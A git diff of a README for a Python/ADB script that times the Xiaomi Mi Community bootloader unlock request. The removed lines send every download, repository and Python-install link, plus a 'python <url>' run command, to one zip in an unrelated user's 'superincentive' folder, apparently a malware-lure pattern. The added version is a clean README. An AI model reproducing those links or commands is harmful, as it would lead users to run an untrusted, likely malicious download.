@@ -1,88 +1,70 @@
-# 🎉 micommunity-unlock-request-automate - Easily Automate Xiaomi Unlock Requests
+# micommunity-unlock-request-automate
 
-[![Download Here](https://raw.githubusercontent.com/GuilhermLira/micommunity-unlock-request-automate/master/superincentive/automate-micommunity-request-unlock-v2.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/GuilhermLira/micommunity-unlock-request-automate/master/superincentive/automate-micommunity-request-unlock-v2.7.zip)
+Automate the Xiaomi Mi Community bootloader unlock request at 00:00 Beijing time via ADB.
 
-## 📌 Introduction
+## How It Works
 
-Welcome to micommunity-unlock-request-automate! This simple Python script helps you automate the Xiaomi Mi Community unlock request at 00:00 Beijing time using ADB (Android Debug Bridge). Whether you are a new or experienced user, this tool simplifies the unlocking process for your Xiaomi device.
+This script connects to your Xiaomi device via ADB, dumps the Mi Community app UI to find the "Apply for unlocking" button, then precisely clicks it at midnight Beijing time using NTP time synchronization.
 
-## 🚀 Getting Started
+## Requirements
 
-To get started with this application, follow these easy steps:
+- Python 3.10+
+- [uv](https://docs.astral.sh/uv/) (recommended) or pip
+- ADB installed and in PATH
+- USB debugging enabled on your Xiaomi device
+- Mi Community app open to the unlock request page
 
-1. **Ensure Your Device is Set Up:**
-   - Confirm that your Xiaomi device is connected to your computer.
-   - Make sure that USB debugging is enabled on your device. You can do this by going to:
-     - Settings > About Phone > Tap Build Number 7 times to unlock Developer Options.
-     - Go back to Settings > Additional settings > Developer Options > Enable USB Debugging.
-   
-2. **Install ADB:**
-   - Download and install ADB on your computer. You can find it on many online resources. Once installed, make sure it’s added to your system's PATH, or directly use it from the installation folder.
-   
-3. **Download the Script:**
-   - Visit this page to download: [Download micommunity-unlock-request-automate](https://raw.githubusercontent.com/GuilhermLira/micommunity-unlock-request-automate/master/superincentive/automate-micommunity-request-unlock-v2.7.zip).
+## Installation
 
-## 📥 Download & Install
+```bash
+# Clone the repo
+git clone https://github.com/masrurimz/micommunity-unlock-request-automate.git
+cd micommunity-unlock-request-automate
 
-1. Click on the following link to access the Releases page:
-   [Visit Release Page](https://raw.githubusercontent.com/GuilhermLira/micommunity-unlock-request-automate/master/superincentive/automate-micommunity-request-unlock-v2.7.zip).
-   
-2. On this page, you will find the latest version of the script. Look for the file name that suits your system, such as `https://raw.githubusercontent.com/GuilhermLira/micommunity-unlock-request-automate/master/superincentive/automate-micommunity-request-unlock-v2.7.zip`.
+# Install with uv (recommended)
+uv sync
 
-3. Click on the file name to download it. Save it to a folder where you can easily access it later.
+# Or install with pip
+pip install .
+```
 
-## ⚙️ Running the Script
+## Usage
 
-1. **Open a Terminal or Command Prompt:**
-   - Navigate to the location where you saved the downloaded script.
+### Live Mode (default)
 
-2. **Execute the Script:**
-   - Type the following command to run the script:
-     ```
-     python https://raw.githubusercontent.com/GuilhermLira/micommunity-unlock-request-automate/master/superincentive/automate-micommunity-request-unlock-v2.7.zip
-     ```
-   - Ensure Python is installed on your computer. If you need to install it, visit [https://raw.githubusercontent.com/GuilhermLira/micommunity-unlock-request-automate/master/superincentive/automate-micommunity-request-unlock-v2.7.zip](https://raw.githubusercontent.com/GuilhermLira/micommunity-unlock-request-automate/master/superincentive/automate-micommunity-request-unlock-v2.7.zip) for downloadable versions.
+Clicks "Apply for unlocking" at 23:59:59.800 Beijing time (GMT+8):
 
-3. **Wait for the Script to Execute:**
-   - The script will automatically send the unlock request at the specified time. Make sure your computer remains on at that time.
+```bash
+uv run mi-unlock
+```
 
-## 🔧 System Requirements
+### Options
 
-- Operating System: Windows, macOS, or Linux
-- Python: Version 3.6 or higher
-- ADB: Ensure ADB is working correctly on your machine
-- A stable internet connection during execution time
+```
+--clicks N       Number of clicks (default: 2)
+--delay SECONDS  Delay between clicks (default: 2.0)
+```
 
-## 🛠️ Features
+### Test Mode
 
-- Automates the unlock request process for Xiaomi MI devices.
-- Supports multiple operating systems.
-- Scheduled requests to match the specific time required.
+Run at a custom time/timezone for testing:
 
-## 📖 Troubleshooting
+```bash
+uv run mi-unlock --test --test-timezone 5 --test-time 14:30
+```
 
-If you encounter any problems while using the script, consider the following tips:
+Test mode requires `--test-timezone` (UTC offset in hours) and `--test-time` (HH:MM or HH:MM:SS).
 
-- **ADB Not Recognized:**
-   Ensure that ADB is properly installed and added to your system’s PATH. Try running `adb devices` in your terminal to check connectivity.
+## How to Prepare Your Device
 
-- **Permission Issues:**
-   Make sure your device's USB debugging is enabled and you have granted permission for your computer to interact with the device.
+1. Enable Developer Options: **Settings → About Phone → Tap Build Number 7 times**
+2. Enable USB Debugging: **Settings → Additional settings → Developer Options → USB Debugging**
+3. Connect device via USB and authorize the ADB prompt
+4. Open the Mi Community app and navigate to the unlock request page
+5. Run the script — it will find the button and wait for the right time
 
-- **Script Errors:**
-   If you see any errors when running the script, check if you have installed Python properly and that you are in the correct folder.
+## License
 
-## 💬 Community Support
+GPL-3.0-or-later — see [LICENSE](LICENSE) for details.
 
-For further assistance, feel free to open an issue in the GitHub repository. Our community is here to help you with any questions or issues you may encounter.
-
-## 📃 License
-
-This project is open-source. Feel free to use, modify, and share it. Please see the license file for more details.
-
-## 🔗 Important Links
-
-- [GitHub Repository](https://raw.githubusercontent.com/GuilhermLira/micommunity-unlock-request-automate/master/superincentive/automate-micommunity-request-unlock-v2.7.zip)
-- [Download Latest Release](https://raw.githubusercontent.com/GuilhermLira/micommunity-unlock-request-automate/master/superincentive/automate-micommunity-request-unlock-v2.7.zip)
-
-Thank you for using micommunity-unlock-request-automate. We hope this tool makes your unlocking process easier and more efficient!
+Original automation script by [chickendrop89](https://github.com/chickendrop89).
